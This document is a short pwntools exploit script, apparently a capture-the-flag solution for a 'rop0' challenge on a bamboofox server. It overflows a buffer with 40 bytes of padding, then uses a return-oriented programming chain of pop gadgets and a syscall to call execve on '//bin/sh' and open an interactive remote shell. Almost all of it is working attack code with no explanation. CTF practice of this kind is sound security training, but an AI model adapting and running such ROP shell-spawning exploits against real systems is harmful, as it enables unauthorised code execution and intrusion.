from pwn import *

context.arch = 'amd64'

#p = process( './rop0' )
p = remote( 'bamboofox.cs.nctu.edu.tw', 12016 )

payload = b'a' * 40

pop_rsi = 0x0000000000401637
pop_rax_rdx_rbx = 0x0000000000478616
pop_rdi = 0x0000000000401516
#mov_prdi_rsi = 0x000000000047a602
syscall = 0x00000000004003da

data = 0x6ccd60

payload += flat( [ pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rsi, 0, pop_rdi, data, syscall ] )

print( len( payload ) )

sh = b'//bin/sh\x00'

p.sendline( sh )
raw_input( 'wait' )
p.sendline( payload )

p.interactive()
